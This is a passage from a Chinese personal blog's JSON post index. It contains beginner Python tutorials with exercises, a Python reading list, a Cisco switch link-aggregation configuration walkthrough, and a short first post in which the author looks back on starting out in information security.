= input('请输入单位: ') if unit == 'in' or unit == '英寸': print('%f英寸 = %f厘米' % (value, value * 2.54)) elif unit == 'cm' or unit == '厘米': print('%f厘米 = %f英寸' % (value, value / 2.54)) else: print('请输入有效的单位') 练习2：百分制成绩转换为等级制成绩。 要求：如果输入的成绩在90分以上（含90分）输出A；80分-90分（不含90分）输出B；70分-80分（不含80分）输出C；60分-70分（不含70分）输出D；60分以下输出E。 参考答案： \"\"\" 百分制成绩转换为等级制成绩 \"\"\" score = float(input('请输入成绩: ')) if score &gt;= 90: grade = 'A' elif score &gt;= 80: grade = 'B' elif score &gt;= 70: grade = 'C' elif score &gt;= 60: grade = 'D' else: grade = 'E' print('对应的等级是:', grade) 练习3：输入三条边长，如果能构成三角形就计算周长和面积。参考答案： \"\"\" 判断输入的边长能否构成三角形，如果能则计算出三角形的周长和面积 \"\"\" a = float(input('a = ')) b = float(input('b = ')) c = float(input('c = ')) if a + b &gt; c and a + c &gt; b and b + c &gt; a: print('周长: %f' % (a + b + c)) p = (a + b + c) / 2 area = (p * (p - a) * (p - b) * (p - c)) ** 0.5 print('面积: %f' % (area)) else: print('不能构成三角形') 说明： 上面使用的通过边长计算三角形面积的公式叫做海伦公式。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"02语言元素","slug":"02语言元素","date":"2021-05-05T05:33:35.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/271348a1.html","link":"","permalink":"http://www.xiaocaibi.top/posts/271348a1.html","excerpt":"","text":"语言元素指令和程序计算机的硬件系统通常由五大部件构成，包括：运算器、控制器、存储器、输入设备和输出设备。其中，运算器和控制器放在一起就是我们通常所说的中央处理器，它的功能是执行各种运算和控制指令以及处理计算机软件中的数据。我们通常所说的程序实际上就是指令的集合，我们程序就是将一系列的指令按照某种方式组织到一起，然后通过这些指令去控制计算机做我们想让它做的事情。今天我们大多数时候使用的计算机，虽然它们的元器件做工越来越精密，处理能力越来越强大，但究其本质来说仍然属于“冯·诺依曼结构”的计算机。“冯·诺依曼结构”有两个关键点，一是指出要将存储设备与中央处理器分开，二是提出了将数据以二进制方式编码。二进制是一种“逢二进一”的计数法，跟我们人类使用的“逢十进一”的计数法没有实质性的区别，人类因为有十根手指所以使用了十进制（因为在数数时十根手指用完之后就只能进位了，当然凡事都有例外，玛雅人可能是因为长年光着脚的原因把脚趾头也算上了，于是他们使用了二十进制的计数法，在这种计数法的指导下玛雅人的历法就与我们平常使用的历法不一样，而按照玛雅人的历法，2012年是上一个所谓的“太阳纪”的最后一年，而2013年则是新的“太阳纪”的开始，后来这件事情被以讹传讹的方式误传为”2012年是玛雅人预言的世界末日“这种荒诞的说法，今天我们可以大胆的猜测，玛雅文明之所以发展缓慢估计也与使用了二十进制有关）。对于计算机来说，二进制在物理器件上来说是最容易实现的（高电压表示1，低电压表示0），于是在“冯·诺依曼结构”的计算机都使用了二进制。虽然我们并不需要每个程序员都能够使用二进制的思维方式来工作，但是了解二进制以及它与我们生活中的十进制之间的转换关系，以及二进制与八进制和十六进制的转换关系还是有必要的。如果你对这一点不熟悉，可以自行使用维基百科或者百度百科科普一下。 说明：近期关于量子计算机的研究已经被推倒了风口浪尖，量子计算机基于量子力学进行运算，使用量子瞬移的方式来传递信息。2018年6月，Intel宣布开发出新款量子芯片并通过了在接近绝对零度环境下的测试；2019年，IBM和Google都推出了自己的量子计算机。 变量和类型在程序设计中，变量是一种存储数据的载体。计算机中的变量是实际存在的数据或者说是存储器中存储数据的一块内存空间，变量的值可以被读取和修改，这是所有计算和控制的基础。计算机能处理的数据有很多种类型，除了数值之外还可以处理文本、图形、音频、视频等各种各样的数据，那么不同的数据就需要定义不同的存储类型。Python中的数据类型很多，而且也允许我们自定义新的数据类型（这一点在后面会讲到），我们先介绍几种常用的数据类型。 整型：Python中可以处理任意大小的整数（Python 2.x中有int和long两种类型的整数，但这种区分对Python来说意义不大，因此在Python 3.x中整数只有int这一种了），而且支持二进制（如0b100，换算成十进制是4）、八进制（如0o100，换算成十进制是64）、十进制（100）和十六进制（0x100，换算成十进制是256）的表示法。 浮点型：浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，浮点数除了数学写法（如123.456）之外还支持科学计数法（如1.23456e2）。 字符串型：字符串是以单引号或双引号括起来的任意文本，比如'hello'和\"hello\",字符串还有原始字符串表示法、字节字符串表示法、Unicode字符串表示法，而且可以书写成多行的形式（用三个单引号或三个双引号开头，三个单引号或三个双引号结尾）。 布尔型：布尔值只有True、False两种值，要么是True，要么是False，在Python中，可以直接用True、False表示布尔值（请注意大小写），也可以通过布尔运算计算出来（例如3 &lt; 5会产生布尔值True，而2 == 1会产生布尔值False）。 复数型：形如3+5j，跟数学上的复数表示一样，唯一不同的是虚部的i换成了j。实际上，这个类型并不常用，大家了解一下就可以了。 变量命名对于每个变量我们需要给它取一个名字，就如同我们每个人都有属于自己的响亮的名字一样。在Python中，变量命名需要遵循以下这些必须遵守硬性规则和强烈建议遵守的非硬性规则。 硬性规则： 变量名由字母（广义的Unicode字符，不包括特殊字符）、数字和下划线构成，数字不能开头。 大小写敏感（大写的a和小写的A是两个不同的变量）。 不要跟关键字（有特殊含义的单词，后面会讲到）和系统保留字（如函数、模块等的名字）冲突。 PEP 8要求： 用小写字母拼写，多个单词用下划线连接。 受保护的实例属性用单个下划线开头（后面会讲到）。 私有的实例属性用两个下划线开头（后面会讲到）。 当然，作为一个专业的程序员，给变量（事实上应该是所有的标识符）命名时做到见名知意也是非常重要的。 变量的使用下面通过几个例子来说明变量的类型和变量使用。 \"\"\" 使用变量保存数据并进行加减乘除运算 \"\"\" a = 321 b = 12 print(a + b) # 333 print(a - b) # 309 print(a * b) # 3852 print(a / b) # 26.75 在Python中可以使用type函数对变量的类型进行检查。程序设计中函数的概念跟数学上函数的概念是一致的，数学上的函数相信大家并不陌生，它包括了函数名、自变量和因变量。如果暂时不理解这个概念也不要紧，我们会在后续的章节中专门讲解函数的定义和使用。 \"\"\" 使用type()检查变量的类型 \"\"\" a = 100 b = 12.345 c = 1 + 5j d = 'hello, world' e = True print(type(a)) # &lt;class 'int'&gt; print(type(b)) # &lt;class 'float'&gt; print(type(c)) # &lt;class 'complex'&gt; print(type(d)) # &lt;class 'str'&gt; print(type(e)) # &lt;class 'bool'&gt; 可以使用Python中内置的函数对变量类型进行转换。 int()：将一个数值或字符串转换成整数，可以指定进制。 float()：将一个字符串转换成浮点数。 str()：将指定的对象转换成字符串形式，可以指定编码。 chr()：将整数转换成该编码对应的字符串（一个字符）。 ord()：将字符串（一个字符）转换成对应的编码（整数）。 下面的代码通过键盘输入两个整数来实现对两个整数的算术运算。 \"\"\" 使用input()函数获取键盘输入(字符串) 使用int()函数将输入的字符串转换成整数 使用print()函数输出带占位符的字符串 \"\"\" a = int(input('a = ')) b = int(input('b = ')) print('%d + %d = %d' % (a, b, a + b)) print('%d - %d = %d' % (a, b, a - b)) print('%d * %d = %d' % (a, b, a * b)) print('%d / %d = %f' % (a, b, a / b)) print('%d // %d = %d' % (a, b, a // b)) print('%d %% %d = %d' % (a, b, a % b)) print('%d ** %d = %d' % (a, b, a ** b)) 说明：上面的print函数中输出的字符串使用了占位符语法，其中%d是整数的占位符，%f是小数的占位符，%%表示百分号（因为百分号代表了占位符，所以带占位符的字符串中要表示百分号必须写成%%），字符串之后的%后面跟的变量值会替换掉占位符然后输出到终端中，运行上面的程序，看看程序执行结果就明白啦。 运算符Python支持多种运算符，下表大致按照优先级从高到低的顺序列出了所有的运算符，运算符的优先级指的是多个运算符同时出现时，先做什么运算然后再做什么运算。除了我们之前已经用过的赋值运算符和算术运算符，我们稍后会陆续讲到其他运算符的使用。 运算符 描述 [] [:] 下标，切片 ** 指数 ~ + - 按位取反, 正负号 * / % // 乘，除，模，整除 + - 加，减 &gt;&gt; &lt;&lt; 右移，左移 &amp; 按位与 ^ | 按位异或，按位或 &lt;= &lt; &gt; &gt;= 小于等于，小于，大于，大于等于 == != 等于，不等于 is is not 身份运算符 in not in 成员运算符 not or and 逻辑运算符 = += -= *= /= %= //= **= &amp;= ` = ^= &gt;&gt;= &lt;&lt;=` 说明： 在实际开发中，如果搞不清楚运算符的优先级，可以使用括号来确保运算的执行顺序。 赋值运算符赋值运算符应该是最为常见的运算符，它的作用是将右边的值赋给左边的变量。下面的例子演示了赋值运算符和复合赋值运算符的使用。 \"\"\" 赋值运算符和复合赋值运算符 \"\"\" a = 10 b = 3 a += b # 相当于：a = a + b a *= a + 2 # 相当于：a = a * (a + 2) print(a) # 算一下这里会输出什么 比较运算符和逻辑运算符比较运算符有的地方也称为关系运算符，包括==、!=、&lt;、&gt;、&lt;=、&gt;=，我相信没有什么好解释的，大家一看就能懂，唯一需要提醒的是比较相等用的是==，请注意这个地方是两个等号，因为=是赋值运算符，我们在上面刚刚讲到过，==才是比较相等的比较运算符。比较运算符会产生布尔值，要么是True要么是False。 逻辑运算符有三个，分别是and、or和not。and字面意思是“而且”，所以and运算符会连接两个布尔值，如果两个布尔值都是True，那么运算的结果就是True；左右两边的布尔值有一个是False，最终的运算结果就是False。相信大家已经想到了，如果and左边的布尔值是False，不管右边的布尔值是什么，最终的结果都是False，所以在做运算的时候右边的值会被跳过（短路处理），这也就意味着在and运算符左边为False的情况下，右边的表达式根本不会执行。or字面意思是“或者”，所以or运算符也会连接两个布尔值，如果两个布尔值有任意一个是True，那么最终的结果就是True。当然，or运算符也是有短路功能的，在它左边的布尔值为True的情况下，右边的表达式根本不会执行。not运算符的后面会跟上一个布尔值，它的作用是得到与该布尔值相反的值，也就是说，后面的布尔值如果是True运算结果就是False，而后面的布尔值如果是False则运算结果就是True。 \"\"\" 比较运算符和逻辑运算符的使用 \"\"\" flag0 = 1 == 1 flag1 = 3 &gt; 2 flag2 = 2 &lt; 1 flag3 = flag1 and flag2 flag4 = flag1 or flag2 flag5 = not (1 != 2) print('flag0 =', flag0) # flag0 = True print('flag1 =', flag1) # flag1 = True print('flag2 =', flag2) # flag2 = False print('flag3 =', flag3) # flag3 = False print('flag4 =', flag4) # flag4 = True print('flag5 =', flag5) # flag5 = False 说明：比较运算符的优先级高于赋值运算符，所以flag0 = 1 == 1先做1 == 1产生布尔值True，再将这个值赋值给变量flag0。print函数可以输出多个值，多个值之间可以用,进行分隔，输出的内容之间默认以空格分开。 练习练习1：华氏温度转换为摄氏温度。 提示：华氏温度到摄氏温度的转换公式为：$C=(F - 32) \\div 1.8$。 参考答案： \"\"\" 将华氏温度转换为摄氏温度 \"\"\" f = float(input('请输入华氏温度: ')) c = (f - 32) / 1.8 print('%.1f华氏度 = %.1f摄氏度' % (f, c)) 说明：在使用print函数输出时，也可以对字符串内容进行格式化处理，上面print函数中的字符串%1.f是一个占位符，稍后会由一个float类型的变量值替换掉它。同理，如果字符串中有%d，后面可以用一个int类型的变量值替换掉它，而%s会被字符串的值替换掉。除了这种格式化字符串的方式外，还可以用下面的方式来格式化字符串，其中{f:.1f}和{c:.1f}可以先看成是{f}和{c}，表示输出时会用变量f和变量c的值替换掉这两个占位符，后面的:.1f表示这是一个浮点数，小数点后保留1位有效数字。 print(f'{f:.1f}华氏度 = {c:.1f}摄氏度') 练习2：输入圆的半径计算计算周长和面积。参考答案： \"\"\" 输入半径计算圆的周长和面积 \"\"\" radius = float(input('请输入圆的半径: ')) perimeter = 2 * 3.1416 * radius area = 3.1416 * radius * radius print('周长: %.2f' % perimeter) print('面积: %.2f' % area) 练习3：输入年份判断是不是闰年。参考答案： \"\"\" 输入年份 如果是闰年输出True 否则输出False \"\"\" year = int(input('请输入年份: ')) # 如果代码太长写成一行不便于阅读 可以使用\\对代码进行折行 is_leap = year % 4 == 0 and year % 100 != 0 or \\ year % 400 == 0 print(is_leap) 说明：比较运算符会产生布尔值，而逻辑运算符and和or会对这些布尔值进行组合，最终也是得到一个布尔值，闰年输出True，平年输出False。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"01初识python","slug":"01初识python","date":"2021-05-04T04:13:49.000Z","updated":"2021-06-27T01:27:42.652Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"初识PythonPython简介Python的历史 1989年圣诞节：Guido von Rossum开始写Python语言的编译器。 1991年2月：第一个Python编译器（同时也是解释器）诞生，它是用C语言实现的（后面），可以调用C语言的库函数。在最早的版本中，Python已经提供了对“类”，“函数”，“异常处理”等构造块的支持，还有对列表、字典等核心数据类型，同时支持以模块为基础来构造应用程序。 1994年1月：Python 1.0正式发布。 2000年10月16日：Python 2.0发布，增加了完整的垃圾回收，提供了对Unicode的支持。与此同时，Python的整个开发过程更加透明，社区对开发进度的影响逐渐扩大，生态圈开始慢慢形成。 2008年12月3日：Python 3.0发布，它并不完全兼容之前的Python代码，不过因为目前还有不少公司在项目和运维中使用Python 2.x版本，所以Python 3.x的很多新特性后来也被移植到Python 2.6/2.7版本中。 目前我们使用的Python 3.7.x的版本是在2018年发布的，Python的版本号分为三段，形如A.B.C。其中A表示大版本号，一般当整体重写，或出现不向后兼容的改变时，增加A；B表示功能更新，出现新功能时增加B；C表示小的改动（例如：修复了某个Bug），只要有修改就增加C。如果对Python的历史感兴趣，可以阅读名为《Python简史》的网络文章。 Python的优缺点Python的优点很多，简单的可以总结为以下几点。 简单明了，学习曲线低，比很多编程语言都容易上手。 开放源代码，拥有强大的社区和生态圈，尤其是在数据分析和机器学习领域。 解释型语言，天生具有平台可移植性，代码可以工作于不同的操作系统。 对两种主流的编程范式（面向对象编程和函数式编程）都提供了支持。 代码规范程度高，可读性强，适合有代码洁癖和强迫症的人群。 Python的缺点主要集中在以下几点。 执行效率稍低，对执行效率要求高的部分可以由其他语言（如：C、C++）编写。 代码无法加密，但是现在很多公司都不销售卖软件而是销售服务，这个问题会被弱化。 在开发时可以选择的框架太多（如Web框架就有100多个），有选择的地方就有错误。 Python的应用领域目前Python在Web应用后端开发、云基础设施建设、DevOps、网络数据采集（爬虫）、自动化测试、数据分析、机器学习等领域都有着广泛的应用。 安装Python解释器想要开始Python编程之旅，首先得在自己使用的计算机上安装Python解释器环境，下面将以安装官方的Python解释器为例，讲解如何在不同的操作系统上安装Python环境。官方的Python解释器是用C语言实现的，也是使用最为广泛的Python解释器，通常称之为CPython。除此之外，Python解释器还有Java语言实现的Jython、C#语言实现的IronPython以及PyPy、Brython、Pyston等版本，有兴趣的读者可以自行了解。 Windows环境可以在Python官方网站下载到Python的Windows安装程序（exe文件），需要注意的是如果在Windows 7环境下安装Python 3.x，需要先安装Service Pack 1补丁包（可以通过一些工具软件自动安装系统补丁的功能来安装），安装过程建议勾选“Add Python 3.x to PATH”（将Python 3.x添加到PATH环境变量）并选择自定义安装，在设置“Optional Features”界面最好将“pip”、“tcl/tk”、“Python test suite”等项全部勾选上。强烈建议选择自定义的安装路径并保证路径中没有中文。安装完成会看到“Setup was successful”的提示。如果稍后运行Python程序时，出现因为缺失一些动态链接库文件而导致Python解释器无法工作的问题，可以按照下面的方法加以解决。 如果系统显示api-ms-win-crt*.dll文件缺失，可以参照《api-ms-win-crt*.dll缺失原因分析和解决方法》一文讲解的方法进行处理或者直接在微软官网下载Visual C++ Redistributable for Visual Studio 2015文件进行修复；如果是因为更新Windows的DirectX之后导致某些动态链接库文件缺失问题，可以下载一个DirectX修复工具进行修复。 Linux环境Linux环境自带了Python 2.x版本，但是如果要更新到3.x的版本，可以在Python的官方网站下载Python的源代码并通过源代码构建安装的方式进行安装，具体的步骤如下所示（以CentOS为例）。 安装依赖库（因为没有这些依赖库可能在源代码构件安装时因为缺失底层依赖库而失败）。 yum -y install wget gcc zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel 下载Python源代码并解压缩到指定目录。 wget https://www.python.org/ftp/python/3.7.6/Python-3.7.6.tar.xz xz -d Python-3.7.6.tar.xz tar -xvf Python-3.7.6.tar 切换至Python源代码目录并执行下面的命令进行配置和安装。 cd Python-3.7.6 ./configure --prefix=/usr/local/python37 --enable-optimizations make &amp;&amp; make install 修改用户主目录下名为.bash_profile的文件，配置PATH环境变量并使其生效。 cd ~ vim .bash_profile # ... 此处省略上面的代码 ... export PATH=$PATH:/usr/local/python37/bin # ... 此处省略下面的代码 ... 激活环境变量。 source .bash_profile macOS环境macOS也自带了Python 2.x版本，可以通过Python的官方网站提供的安装文件（pkg文件）安装Python 3.x的版本。默认安装完成后，可以通过在终端执行python命令来启动2.x版本的Python解释器，启动3.x版本的Python解释器需要执行python3命令。 运行Python程序确认Python的版本可以Windows的命令行提示符中键入下面的命令。 python --version 在Linux或macOS系统的终端中键入下面的命令。 python3 --version 当然也可以先输入python或python3进入交互式环境，再执行以下的代码检查Python的版本。 import sys print(sys.version_info) print(sys.version) 编写Python源代码可以用文本编辑工具（推荐使用Sublime、Visual Studio Code等高级文本编辑工具）编写Python源代码并用py作为后缀名保存该文件，代码内容如下所示。 print('hello, world!') 运行程序切换到源代码所在的目录并执行下面的命令，看看屏幕上是否输出了”hello, world!”。 python hello.py 或 python3 hello.py 代码中的注释注释是编程语言的一个重要组成部分，用于在源代码中解释代码的作用从而增强程序的可读性和可维护性，当然也可以将源代码中不需要参与运行的代码段通过注释来去掉，这一点在调试程序的时候经常用到。注释在随源代码进入预处理器或编译时会被移除，不会在目标代码中保留也不会影响程序的执行结果。 单行注释 - 以#和空格开头的部分 多行注释 - 三个引号开头，三个引号结尾 \"\"\" 第一个Python程序 - hello, world! 向伟大的Dennis M. Ritchie先生致敬 \"\"\" print('hello, world!') # print(\"你好, 世界！\") Python开发工具IDLE - 自带的集成开发工具IDLE是安装Python环境时自带的集成开发工具，如下图所示。但是由于IDLE的用户体验并不是那么好所以很少在实际开发中被采用。 IPython - 更好的交互式编程工具IPython是一种基于Python的交互式解释器。相较于原生的Python交互式环境，IPython提供了更为强大的编辑和交互功能。可以通过Python的包管理工具pip安装IPython，具体的操作如下所示。 pip install ipython 或 pip3 install ipython 安装成功后，可以通过下面的ipython命令启动IPython，如下图所示。 Sublime Text - 高级文本编辑器 首先可以通过官方网站下载安装程序安装Sublime Text 3或Sublime Text 2。 安装包管理工具。 通过快捷键Ctrl+`或者在View菜单中选择Show Console打开控制台，输入下面的代码。 Sublime 3 import urllib.request,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler()));open(os.path.join(ipp,pf),'wb').write(urllib.request.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read()) Sublime 2 import urllib2,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();os.makedirs(ipp)ifnotos.path.exists(ipp)elseNone;urllib2.install_opener(urllib2.build_opener(urllib2.ProxyHandler()));open(os.path.join(ipp,pf),'wb').write(urllib2.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read());print('Please restart Sublime Text to finish installation') 在浏览器中输入 https://sublime.wbond.net/Package%20Control.sublime-package 下载包管理工具的安装包，并找到安装Sublime目录下名为\"Installed Packages\"的目录，把刚才下载的文件放到这个文件加下，然后重启Sublime Text就搞定了。 安装插件。通过Preference菜单的Package Control或快捷键Ctrl+Shift+P打开命令面板，在面板中输入Install Package就可以找到安装插件的工具，然后再查找需要的插件。我们推荐大家安装以下几个插件： SublimeCodeIntel - 代码自动补全工具插件。 Emmet - 前端开发代码模板插件。 Git - 版本控制工具插件。 Python PEP8 Autoformat - PEP8规范自动格式化插件。 ConvertToUTF8 - 将本地编码转换为UTF-8。 说明：事实上Visual Studio Code可能是更好的选择，它不用花钱并提供了更为完整和强大的功能，有兴趣的读者可以自行研究。 PyCharm - Python开发神器PyCharm的安装、配置和使用在《玩转PyCharm》进行了介绍，有兴趣的读者可以选择阅读。 练习 在Python交互式环境中输入下面的代码并查看结果，请尝试将看到的内容翻译成中文。 import this 说明：输入上面的代码，在Python的交互式环境中可以看到Tim Peter撰写的“Python之禅”，里面讲述的道理不仅仅适用于Python，也适用于其他编程语言。 学习使用turtle在屏幕上绘制图形。 说明：turtle是Python内置的一个非常有趣的模块，特别适合对计算机程序设计进行初体验的小伙伴，它最早是Logo语言的一部分，Logo语言是Wally Feurzig和Seymour Papert在1966发明的编程语言。 import turtle turtle.pensize(4) turtle.pencolor('red') turtle.forward(100) turtle.right(90) turtle.forward(100) turtle.right(90) turtle.forward(100) turtle.right(90) turtle.forward(100) turtle.mainloop() 提示：本章提供的代码中还有画国旗和画小猪佩奇的代码，有兴趣的读者请自行研究。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"python书籍参考","slug":"python书籍参考","date":"2021-05-02T08:35:24.000Z","updated":"2021-09-20T08:47:43.791Z","comments":true,"path":"posts/bfb82145.html","link":"","permalink":"http://www.xiaocaibi.top/posts/bfb82145.html","excerpt":"","text":"Python参考书籍入门读物 《Python基础教程》（Beginning Python From Novice to Professional） 《Python学习手册》（Learning Python） 《Python编程》（Programming Python） 《Python Cookbook》 《Python程序设计》（Python Programming: An Introduction to Computer Science） 《Modern Python Cookbook》 进阶读物 《Python核心编程》（Core Python Applications Programming） 《流畅的Python》（Fluent Python） 《Effective Python：编写高质量Python代码的59个有效方法》（Effective Python 59 Specific Ways to Write Better Python） 《Python设计模式》（Learning Python Design Patterns） 《Python高级编程》（Expert Python Programming） 《Python性能分析与优化》（Mastering Python High Performance） Web框架 《Django基础教程》（Tango with Django） 《轻量级Django》（Lightweight Django） 《Python Web开发：测试驱动方法》（Test-Driven Development with Python） 《Web Development with Django Cookbook》 《Test-Driven Development with Django》 《Django Project Blueprints 》 《Flask Web开发：基于Python的Web应用开发实战》（Flask Web Development: Developing Web Applications with Python） 《深入理解Flask》（Mastering Flask） 爬虫开发 《用Python写网络爬虫》（Web Scraping with Python） 《精通Python爬虫框架Scrapy》（Learning Scrapy） 《Python网络数据采集》（Web Scraping with Python） 《Python爬虫开发与项目实战》 《Python 3网络爬虫开发实战》 数据分析 《利用Python进行数据分析》（Python for Data Analysis） 《Python数据科学手册》（Python Data Science Handbook） 《Python金融大数据分析》（Python for Finance） 《Python数据可视化编程实战》（Python Data Visualization Cookbook） 《Python数据处理》（Data Wrangling with Python） 机器学习 《Python机器学习基础教程》（Introduction to Machine Learning with Python） 《Python机器学习实践指南》（Python Machine Learning Blueprints） 《Python Machine Learning Case Studies》 《Python机器学习实践：测试驱动的开发方法》（Thoughtful Machine Learning with Python A Test Driven Approach） 《Python机器学习经典实例》（Python Machine Learning Cookbook） 《TensorFlow：实战Google深度学习框架》","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"链路聚合","slug":"链路聚合","date":"2021-04-28T00:59:27.000Z","updated":"2021-06-27T01:53:06.623Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"链路聚合 什么是链路聚合 链路聚合（英语：Link Aggregation）是一个计算机网络术语，指将多个物理端口汇聚在一起，形成一个逻辑端口，以实现出/入流量吞吐量在各成员端口的负荷分担，交换机根据用户配置的端口负荷分担策略决定网络封包从哪个成员端口发送到对端的交换机。当交换机检测到其中一个成员端口的链路发生故障时，就停止在此端口上发送封包，并根据负荷分担策略在剩下的链路中重新计算报文的发送端口，故障端口恢复后再次担任收发端口。链路聚合在增加链路带宽、实现链路传输弹性和工程冗余等方面是一项很重要的技术。 环境: 两台cisco 3560-24PS通过fa 0/2和fa 0/2相连和fa 0/3相连，三端口属于po1 pc1:192.168.20.2 vlan1 接SW1的fa0/24 pc2:192.168.20.35 vlan1 接SW2的fa0/24 pc1 pc2 SA配置 Switch(config)#hostname linhuanxunSA 更换交换机名称 linhuanxunSA(config)#interface port-channel 1 聚合通道1 linhuanxunSA(config-if)#exit linhuanxunSA(config)#int fastEthernet 0/1 进入0/1 端口开启聚合通道1 linhuanxunSA(config-if)#channel-group 1 mode on linhuanxunSA(config-if)#int fa 0/2 linhuanxunSA(config-if)#channel-group 1 mode linhuanxunSA(config)#int fastEthernet 0/3 linhuanxunSA(config-if)#channel-group 1 mode on linhuanxunSA(config-if)#exit linhuanxunSA(config)#interface port-channel 1 linhuanxunSA(config-if)#sw mode acc linhuanxunSA(config-if)#sw mode trunk 将交换机链路类型设为trunk linhuanxunSA(config-if)#switchport trunk allowed vlan all 允许所有vlan 通过 然后第二台和第一台配置是一样的SW2配置 Switch&gt;enable Switch#conf Switch(config)#hostname linhuanxunSW2 linhuanxunSW2(config)#int port-channel 1 linhuanxunSW2(config)#int rang fa0/1-fa0/3 linhuanxunSW2(config-if-range)#channel-group 1 mode on linhuanxunSW2(config-if-range)#exit linhuanxunSW2(config)#int port-channel 1 linhuanxunSW2(config-if)#sw mode access linhuanxunSW2(config-if)#sw mode trunk linhuanxunSW2(config-if)#switchport trunk allowed vlan all 测试:用pc1 ping到pc2 192.168.20.35然后我们模拟现实中断条一条交叉线 进行测试","categories":[],"tags":[{"name":"思科","slug":"思科","permalink":"http://www.xiaocaibi.top/tags/%E6%80%9D%E7%A7%91/"}]},{"title":"第一篇文章","slug":"个人第一篇博客文章","date":"2021-04-25T04:13:49.000Z","updated":"2021-06-27T01:53:08.137Z","comments":true,"path":"posts/undefined.html","link":"","permalink":"http://www.xiaocaibi.top/posts/undefined.html","excerpt":"","text":"第一篇文章 五年前的今天在无意中误打误撞我走向了信息安全这条路 &nbsp;还记得当初刚学会Ping命令，于是一边Ping着百度一边担心自儿会打死死百度； 以为进入后台就是拿到了最高权限； 远控永远不上线， 黑页改个名字就成了自己做的， iApp写个短信钓鱼盗号，盗了一群孩子QQ号…… 从一开始的刷钻盗， 到后来的挂黑页娱圈， 遇见了很多人， 经历了许多的事， 也做过许多不该做的、没有意义的事。 一路走来摸爬滚到今天， 自己也有了一个比较成熟的计划。 希望自己可以一直不忘初心，坚守自己当初的信念。 加油可爱天真帅气-web安全小菜逼","categories":[],"tags":[{"name":"第一篇","slug":"第一篇","permalink":"http://www.xiaocaibi.top/tags/%E7%AC%AC%E4%B8%80%E7%AF%87/"}]}],"categories":[{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/categories/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"},{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/categories/python/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://www.xiaocaibi.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"中国网络安全法","slug":"中国网络安全法","permalink":"http://www.xiaocaibi.top/tags/%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"},{"name":"web安全小菜逼","slug":"web安全小菜逼","permalink":"http://www.xiaocaibi.top/tags/web%E5%AE%89%E5%85%A8%E5%B0%8F%E8%8F%9C%E9%80%BC/"},{"name":"法律","slug":"法律","permalink":"http://www.xiaocaibi.top/tags/%E6%B3%95%E5%BE%8B/"},{"name":"CTF","slug":"CTF","permalink":"http://www.xiaocaibi.top/tags/CTF/"},{"name":"Linux","slug":"Linux","permalink":"http://www.xiaocaibi.top/tags/Linux/"},{"name":"windows","slug":"windows","permalink":"http://www.xiaocaibi.top/tags/windows/"},{"name":"日志分析","slug":"日志分析","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"},{"name":"入侵排查篇","slug":"入侵排查篇","permalink":"http://www.xiaocaibi.top/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/"},{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"},{"name":"linun","slug":"linun","permalink":"http://www.xiaocaibi.top/tags/linun/"},{"name":"解析动态内容","slug":"解析动态内容","permalink":"http://www.xiaocaibi.top/tags/%E8%A7%A3%E6%9E%90%E5%8A%A8%E6%80%81%E5%86%85%E5%AE%B9/"},{"name":"并发下载","slug":"并发下载","permalink":"http://www.xiaocaibi.top/tags/%E5%B9%B6%E5%8F%91%E4%B8%8B%E8%BD%BD/"},{"name":"存储数据","slug":"存储数据","permalink":"http://www.xiaocaibi.top/tags/%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE/"},{"name":"数据采集和解析","slug":"数据采集和解析","permalink":"http://www.xiaocaibi.top/tags/%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%92%8C%E8%A7%A3%E6%9E%90/"},{"name":"网络爬虫","slug":"网络爬虫","permalink":"http://www.xiaocaibi.top/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"},{"name":"FastAPI","slug":"FastAPI","permalink":"http://www.xiaocaibi.top/tags/FastAPI/"},{"name":"项目上线","slug":"项目上线","permalink":"http://www.xiaocaibi.top/tags/%E9%A1%B9%E7%9B%AE%E4%B8%8A%E7%BA%BF/"},{"name":"单元测试","slug":"单元测试","permalink":"http://www.xiaocaibi.top/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"name":"异步任务和定时任务","slug":"异步任务和定时任务","permalink":"http://www.xiaocaibi.top/tags/%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"name":"接入三方平台","slug":"接入三方平台","permalink":"http://www.xiaocaibi.top/tags/%E6%8E%A5%E5%85%A5%E4%B8%89%E6%96%B9%E5%B9%B3%E5%8F%B0/"},{"name":"使用缓存","slug":"使用缓存